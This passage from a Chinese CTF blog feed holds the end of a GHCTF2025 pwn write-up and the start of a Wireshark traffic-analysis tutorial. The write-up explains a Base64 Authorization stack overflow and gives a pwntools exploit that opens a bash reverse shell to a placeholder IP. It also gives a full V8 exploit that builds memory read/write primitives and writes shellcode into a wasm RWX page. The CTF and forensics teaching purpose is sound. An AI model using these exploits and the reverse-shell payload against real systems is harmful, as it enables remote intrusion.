src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201446921.png" alt="image-20250310201446921"></p><ul><li>该协议会先处理<code>GET、POST</code>参数，参数正确则会将一下web页面等从服务器发送到客户端中<ul><li>这里在发送<code>web</code>页面之前还会检查我们请求路径的合法性，<code>s</code>这个字符串数组保存的就是<code>web</code>页面的路径</li><li>经过一些列检查后，如果检查都过了就会执行<code>execute_cgi(a1,s,s1,j)</code>这个函数，我们介绍一下这个函数传递的参数</li><li><code>a1</code>：是代表客户端的远程描述符，用于服务器与客户端交互</li><li><code>s</code>：服务器<code>web</code>页面的路径</li><li><code>s1</code>：接收的请求头（即<code>http</code>报文第一行）</li><li><code>j</code>：接收的参数个数</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201844648.png" alt="image-20250310201844648"></p><ul><li>这里注意：如果请求的路径不合法这里就会发送<code>HTTP</code>响应报文比如<code>HTTP/1.0 404 NOT FOUND</code></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">404</span> NOT FOUND\r\n</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>jdbhttpd/0.1.0\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html\r\n</span><br><span class="line">&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n</span><br><span class="line">&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n</span><br><span class="line">your request because the resource specified\r\n</span><br><span class="line">is unavailable or nonexistent.\r\n</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;\r\n</span><br></pre></td></tr></table></figure><ul><li>接下来我们查看一下函数<code>execute_cgi</code>具体的执行流程，我们先查看一下这个函数的局部变量</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202510502.png" alt="image-20250310202510502"></p><ul><li>然后我们再查看一下函数具体执行逻辑，我们先会将<code>文件路径</code>复制给<code>dest</code></li><li>这个函数会根据<code>GET</code>或者<code>POST</code>方法选择处理报文的方式，这里我们重点就来看<code>POST</code>方法<ul><li>如果是<code>POST</code>方法就会接收并处理<code>Content-Length</code>、<code>Authorization: Basic</code></li><li>并且会调用<code>GdecBase64</code>函数对<code>Authorization: Basic</code>后面紧跟着的内容进行<code>Base64</code>解码，将解码后的结果存储在<code>V18</code>这里</li><li><strong>注意在这里就会有一个栈溢出的漏洞了</strong></li><li>之后会对<code>v18</code>的开头进行检查，检查是否为<code>pwner</code>，如果<code>v18</code>的开头不是<code>pwner</code>程序就会出问题</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202804379.png" alt="image-20250310202804379"></p><ul><li>我们会将<code>Base64</code>解码之前的数据存放在<code>v21</code>这边，然后解码之后会存放在<code>v18</code>这边，但是<code>v21</code>这边存储的字节比<code>v18</code>这边多很多，所以这边我们就可以通过溢出，有机会溢出到<code>dest</code>这个数组</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310203748471.png" alt="image-20250310203748471"></p><ul><li>之后我们再看一下之后的程序逻辑，检查完<code>pwner</code>后，正常情况下程序都会执行到<code>execl()</code>这边，而这里就相当于<code>execve</code>，只不过只不过这个时候我们远程交互用的文件描述符是<code>4</code>，而不是标准输出流。所以命令执行的结果并不会显示到我们的平面中，这时我们<code>getshell</code>之后就需要反弹<code>shell</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310204023120.png" alt="image-20250310204023120"></p><ul><li>所以思路就是通过<code>Authorization: Basic</code>后面跟着的内容去构造栈溢出，并且使用<code>\x00</code>绕过<code>strcmp(v18, &quot;pwner&quot;)</code>这个检查</li><li>之后我们就可以<code>getshell</code>，<code>getshell</code>后就可以反弹shell了。这个构造栈溢出的偏移量自己手动算算就出来了。</li></ul><h2 id="fruit_ninja_exp"><a class="markdownIt-Anchor" href="#fruit_ninja_exp"></a> fruit_ninja_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">24279</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;pwner\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">250</span> +<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line">s = b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">body = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1\n\r&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;POST /rule.cgi\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Length: &#123;&#125;\r\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += <span class="string">&#x27;Authorization: Basic &#x27;</span>+ s +<span class="string">&#x27;\r\n\n&#x27;</span></span><br><span class="line">payload += body</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="my_v8"><a class="markdownIt-Anchor" href="#my_v8"></a> my_v8</h1><ul><li><code>my_v8</code>这题要写的内容太多了，就先挖个坑吧，来日方长，慢慢填。</li></ul><h2 id="my_v8_exp"><a class="markdownIt-Anchor" href="#my_v8_exp"></a> my_v8_exp</h2><ul><li>这里就先附上<code>exp</code>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">// ××××××××<span class="number">1.</span> 无符号<span class="number">64</span>位整数和<span class="number">64</span>位浮点数的转换代码×××××××</span><br><span class="line">var buf =new ArrayBuffer(<span class="number">16</span>);</span><br><span class="line">var float64 = new Float64Array(buf);</span><br><span class="line">var bigUint64 = new BigUint64Array(buf);</span><br><span class="line">// 浮点数转换为<span class="number">64</span>位无符号整数</span><br><span class="line">function f2i(f)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为浮点数</span><br><span class="line">function i2f(i)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为<span class="number">16</span>进制字节串</span><br><span class="line">function <span class="built_in">hex</span>(i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">// ××××××××<span class="number">2.</span> addressOf和fakeObject的实现××××××××</span><br><span class="line">var obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line">var obj_array = [obj];</span><br><span class="line">var float_array = [<span class="number">1.1</span>];</span><br><span class="line">var obj_array_map = obj_array.Myread();</span><br><span class="line">var float_array_map = float_array.Myread();</span><br><span class="line">// 泄露某个<span class="built_in">object</span>的地址</span><br><span class="line">function addressOf(obj_to_leak)</span><br><span class="line">&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.Mywrite(float_array_map);</span><br><span class="line">    let obj_addr = f2i(obj_array[<span class="number">0</span>]) - 1n;</span><br><span class="line">    obj_array.Mywrite(obj_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line">// 将某个addr强制转换为<span class="built_in">object</span>对象</span><br><span class="line">function fakeObject(addr_to_fake)</span><br><span class="line">&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + 1n);</span><br><span class="line">    float_array.Mywrite(obj_array_map);</span><br><span class="line">    let faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.Mywrite(float_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line">var fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(0n),</span><br><span class="line">    i2f(0x41414141n),</span><br><span class="line">    i2f(0x1000000000n),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line">var fake_array_addr = addressOf(fake_array);</span><br><span class="line">var fake_object_addr = fake_array_addr - 0x40n + 0x10n;</span><br><span class="line">var fake_object = fakeObject(fake_object_addr);</span><br><span class="line">function read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    let leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    console.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line">function write64(addr, data)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    console.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(data));    </span><br><span class="line">&#125;</span><br><span class="line">var wasmCode = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f = wasmInstance.exports.main;</span><br><span class="line">var f_addr = addressOf(f);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="built_in">hex</span>(f_addr));</span><br><span class="line">var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;</span><br><span class="line">var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;</span><br><span class="line">var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;</span><br><span class="line">var rwx_page_addr = read64(wasm_instance_addr + 0x88n);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="built_in">hex</span>(rwx_page_addr));</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line">var data_buf = new ArrayBuffer(<span class="number">24</span>);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), true);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：官方wp来了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>流量分析基础</title>
    <link href="http://iyheart.github.io/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://iyheart.github.io/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2025-03-05T11:33:50.000Z</published>
    <updated>2025-03-26T14:37:16.442Z</updated>
    
    <content type="html"><![CDATA[<ul><li>学习文章：<a href="https://www.cnblogs.com/zichliang/p/17477251.html">【保姆级教学】抓包工具Wireshark使用教程 - 始識 - 博客园</a></li><li>参考文章：<a href="https://jiangjiyue.github.io/2024/07/04/dd58c5ed/#Wireshark%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">应急响应之Wireshark流量分析 - SafeKiller Zone</a></li></ul><h1 id="计算机网络基础"><a class="markdownIt-Anchor" href="#计算机网络基础"></a> 计算机网络基础</h1><ul><li>这个只是简单的介绍，默认有计算机网络的基础。</li></ul><h2 id="常用协议"><a class="markdownIt-Anchor" href="#常用协议"></a> 常用协议</h2><ul><li><strong>应用层</strong>：<ul><li>HTTP协议：超文本传输协议，最经常使用的协议</li><li>HTTPS协议：密文传输协议，抓包一般会抓到TLS的流量包，这时被加密的数据</li><li>DNS域名解析协议：将域名转化为对应ip</li><li>DHCP协议：自动分配IP地址的协议</li><li>FTP协议：客户端和宿主机文件传输协议</li><li>TFTP协议：简单文件传输协议，一般用于IOT设备，这个协议偏向底层硬件。</li><li>SMTP协议：邮件传输协议，主要就是传输文件</li><li>Telnet协议：远程终端协议，主要是远程登录和远程管理</li><li>Modbus协议：工业控制协议，通用的工业通信协议</li><li>ssh协议：通常用于远程连接</li></ul></li><li><strong>传输层</strong>：<ul><li>TCP协议：</li><li>UDP协议</li></ul></li><li><strong>网络层</strong>：<ul><li>IP协议：</li><li>ICMP协议：</li><li>IGMP协议：</li><li>OSPF协议：</li></ul></li><li><strong>数据链路层</strong>：<ul><li>ARP协议：</li></ul></li></ul><h2 id="协议常见端口"><a class="markdownIt-Anchor" href="#协议常见端口"></a> 协议常见端口</h2><ul><li>端口这个概念主要是在传输层和应用层之间通信的一个抽象概念。所以只有在应用层上的协议采用端口这个概念。</li></ul><blockquote><ul><li><p>HTTP协议：80端口</p></li><li><p>HTTPS协议：443端口</p></li><li><p>DNS域名解析协议：53端口</p></li><li><p>DHCP协议：67、68端口</p></li><li><p>FTP协议：20/21端口</p></li><li><p>TFTP协议：69端口</p></li><li><p>SMTP协议：25端口，SSL加密端口为465端口</p></li><li><p>Telnet协议：23端口</p></li><li><p>Modbus协议：502端口</p></li><li><p>SSH协议：22端口</p></li><li><p>mysql协议或者服务：3306端口</p></li></ul></blockquote><h1 id="wireshark使用"><a class="markdownIt-Anchor" href="#wireshark使用"></a> wireshark使用</h1><ul><li>wireshark是一个底层的抓包软件，还有一些抓包软件：如<code>fiddler</code>、<code>mitmdump</code>这两个抓包软件</li><li><code>wireshark</code>这个软件与<code>burp</code>软件的功能还是差别很大的，<code>burp</code>是专门抓<code>http</code>包的，并且一些功能也是对<code>http</code>包开发的，比如爆破之类的。</li></ul><h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h2><ul><li><p>由于流量包很多，所以我们在看流量包的时候就必须要使用过滤的命令，从而快速找到相对应的流量包。</p></li><li><p><strong>基于IP地址过滤</strong>：</p><ul><li><strong>筛选源ip为xx的包</strong>：<code>ip.src==xxx.xxx.xxx.xxx</code></li><li><strong>筛选目标ip为xx的包</strong>：<code>ip.dst==xxx.xxx.xxx.xxx</code></li><li><strong>筛选ip为xx的包</strong>：<code>ip.addr==xxx.xxx.xxx.xxx</code></li></ul></li><li><p><strong>基于MAC地址过滤</strong>：过滤的mac地址书写方法使用<code>windows</code>的mac地址的写法</p><ul><li><strong>筛选mac地址为xx的包</strong>：<code>eth.src==xx-xx-xx-xx</code></li><li><strong>筛选目标mac为xx的包</strong>：<code>eth.dst=xx-xx-xx-xx</code></li><li><strong>筛选mac为xx的包</strong>：<code>eth.addr=xx-xx-xx-xx</code></li></ul></li><li><p><strong>基于端口号过滤</strong>：端口号用于流量包是从什么应用发出来的，如果端口是通过<code>UDP</code>协议的就将<code>tcp</code>换成<code>udp</code></p><ul><li><strong>过滤源端口为4694的包</strong>：<code>tcp.srcport==4694</code></li><li><strong>过滤tcp端口为4694的包</strong>：<code>tcp.port==4694</code></li><li><strong>过滤目的tcp端口为4694的包</strong>：<code>tcp.dstport==4694</code></li></ul></li><li><p><strong>基于协议过滤</strong>：</p><ul><li><strong>只看arp协议</strong>：<code>arp</code></li><li><strong>只看dhcp</strong>：<code>dhcp</code></li><li><strong>只看https</strong>：<code>https</code></li></ul></li><li><p><strong>组合过滤</strong>：</p><ul><li><strong>and组合，dhcp包并且只想看某台电脑的包</strong>：<code>dhcp and eth.src==xx-xx-xx-xx</code></li><li><strong>or组合，dhcp包或者arp包</strong>：<code>dhcp or arp</code></li><li><code>!(非)</code>：不想看某个协议的包</li></ul></li><li><p><strong>其他过滤</strong>：</p><ul><li><strong>过滤域名</strong>：<code>http.port==&quot;www.baidu.com&quot;</code>，只看含义<code>www.baidu.com</code>的<code>HTTP</code>流量包</li></ul></li></ul><h2 id="其他实用功能"><a class="markdownIt-Anchor" href="#其他实用功能"></a> 其他实用功能</h2><h3 id="记录出现ip-mac-端口"><a class="markdownIt-Anchor" href="#记录出现ip-mac-端口"></a> 记录出现IP、MAC、端口</h3><ul><li>这个功能可以让我们快速知道这个流量包中到底有多少个<code>IP</code>地址，这样我们就不用一个一个在流量包中翻找。</li><li>这个功能的具体位置如下</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250308215944815.png" alt="image-20250308215944815"></p><ul><li>打开后我们就可以看到如下界面，这时我们很快就可以确定哪些地址是作为客户端的地址，哪些地址是作为服务器的地址。</li><li>这里如果选择<code>TCP</code>、<code>UDP</code>就可以看到开放的端口</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250308220042456.png" alt="image-20250308220042456"></p><h3 id="协议分级"><a class="markdownIt-Anchor" href="#协议分级"></a> 协议分级</h3><ul><li>这个功能可以帮助我们统计出各层流量包的占比，我们在进行流量分析的时候可以有一个总体的把握：<ul><li>电脑接收什么协议的流量包，这些流量包的占比</li><li>从流量包中，我们可以初步确定电脑开启了什么服务</li><li>还可以从流量包中可以把握，黑客网络的什么层面进行攻击</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306201707926.png" alt="image-20250306201707926"></p><ul><li>接下来我们就来详细查看一下这个协议分级的界面，从这里我们就可以从总体上把握黑客攻击的一些情况：<ul><li>出现了<code>MySQL</code>协议，我们就会想到攻击者可能动了数据库，或者攻击者进行了<code>sql</code>注入漏洞的利用</li><li>出现<code>HTTP</code>协议或者<code>HTTPS</code>协议比较多，攻击者可能就是利用网页漏洞进行攻击。</li><li>出现<code>SSH</code>协议就表示电脑可能有被远程连接过，或者尝试远程连接</li><li>出现<code>FTP</code>协议就表示可能有文件进行传输等（HTTPS、HTTP协议也能进行文件传输）</li><li>出现<code>SMTP</code>协议就表面有可能有邮件传输</li><li><strong>所以对应的协议和端口需要记下来，这样做流量分析的时候才能快速反应</strong></li><li>这里出现了分组<strong>分组占比</strong>和<strong>字节占比</strong></li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306202702466.png" alt="image-20250306202702466"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306203454111.png" alt="image-20250306203454111"></p><h3 id="追踪流功能"><a class="markdownIt-Anchor" href="#追踪流功能"></a> 追踪流功能</h3><ul><li><code>追踪流</code>的功能只有在对<code>UDP</code>、<code>TCP</code>协议或者更上层的协议分析的时候具有的功能，因为在这层或者这层之上才出现<code>会话</code>和<code>流</code>的概念</li><li>在网络传输中，<strong>网络封装的包</strong>是有大小的限制的<ul><li>所以我们发送一个数据或者是下载一个应用，就需要将这个应用，拆成非常多个流量包，传送到目的主机中才整合起来</li><li>或者我们一个发送的数据包太小，可能会多个数据包整合成一个数据包进行发送。</li><li>对于一个数据分多个包发送，到达目的主机时间不同，我们手动分析的话就比较困难，所以就有了<strong>追踪流</strong>功能</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306204147716.png" alt="image-20250306204147716"></p><ul><li>使用这个功能后，会打开一个界面，这个界面如下图所示（这是另一个例子）：<ul><li>这里注意，一个完整的数据相当于一个流，比如我们下载了一个<code>zip</code>压缩包，并且我们现在追踪的就是这个流，所以这个流<code>0</code>出现的数据就是整个压缩包的二进制数据，而流<code>1</code>就是其他的数据了</li><li>另存为就会将这整个数据（包括协议的内容）保存到文件中，文件后缀可以自己定义</li><li>这个功能在对分析<strong>攻击者文件上传</strong>或者是<strong>下载的数据</strong>效率非常的高</li><li><strong>注意</strong>：提取下载文件的时候不需要提取整个对话，只要提取发送文件的到目标主机这个对话即可</li><li><strong>注意</strong>：有些时候遇到特殊字符，我们就需要使用<code>16进制</code>来显示数据</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306205219073.png" alt="image-20250306205219073"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306205710394.png" alt="image-20250306205710394"></p><h3 id="搜索关键字符串"><a class="markdownIt-Anchor" href="#搜索关键字符串"></a> 搜索关键字符串</h3><ul><li>该功能不会自动显示在<code>wireshark</code>这个界面中，要点击这个放大镜按钮，才会显示，这个功能就相当于搜索</li><li>就输入关键字符串，就会跳转到相应的包中，查看具体内容，有的时候很好用</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306210149243.png" alt="image-20250306210149243"></p><ul><li>这里的搜索功能还可以使用其他的搜索语法，其他的搜索语法如下：</li></ul><p><img 